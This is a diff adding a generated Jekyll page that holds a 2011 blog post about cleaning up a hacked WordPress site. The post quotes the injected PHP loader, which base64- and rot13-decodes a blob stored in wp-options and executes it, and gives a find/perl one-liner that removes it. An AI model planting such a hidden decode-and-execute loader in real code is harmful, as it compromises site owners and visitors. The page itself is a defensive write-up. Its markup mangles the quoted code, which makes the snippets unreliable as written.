@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>We're back</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+    </head>
+    <body>
+
+        <div class="container">
+          <div class="site">
+            <div class="header">
+              <h1 class="title"><a href="/">Your New Jekyll Site</a></h1>
+              <a class="extra" href="/">home</a>
+            </div>
+
+                <h2>We're back</h2>
+<p class="meta">11 Jul 2011</p>
+
+<div class="post">
+<p>So I totally got hacked. Reminder: be vigilant about upgrading wordpress and its plugins, or bad things happen.</p>
+
+<p>The hack looks like this, and appears all over the place, at the top of some files and the bottom of others. It decodes a huge blob of encoded text that was stuffed into one of the wp-options values.
+<blockquote>get<em>option(\&quot;</em>transient<em>feed</em>98e8dbd04edf43b096e815a29343b006\&quot;); $z=base64<em>decode(str</em>rot13($z)); if(strpos($z,\&quot;0FE00707\&quot;)!==false){ $<em>z=create</em>function(\&quot;\&quot;,$z); @$<em>z(); }</blockquote>
+My first thought: &quot;Oh crap, removing that text from hundreds of files? No thanks.&quot;. Command line to the rescue! Thanks to Perl for still being awesome after all these years.
+<blockquote>find . -name &quot;<em>.php&quot; -exec perl -e &#39;s/^.</em></em>transient<em>feed</em>98e8dbd04edf43b096e815a29343b006.*$//g&#39; -p -i {} \;</blockquote>
+If you&#39;ve been struck by the same thing, just replace the <em>transient</em>feed with your own (the numbers probably change). These script-kiddy hackers are a perpetual annoyance. Hey kids - go build something awesome and useful instead of messing our web sites.</p>
+
+</div>
+
+
+            <div class="footer">
+              <div class="contact">
+                <p>
+                  Dan Walmsley<br />
+                  CTO, NationBuilder<br />
+                  dan@nationbuilder.com
+                </p>
+              </div>
+              <div class="contact">
+                <p>
+                  <a href="http://github.com/yourusername/">github.com/yourusername</a><br />
+                  <a href="http://twitter.com/yourusername/">twitter.com/yourusername</a><br />
+                </p>
+              </div>
+            </div>
+          </div>
+        </div> <!-- /container -->
+
+    </body>
+</html>
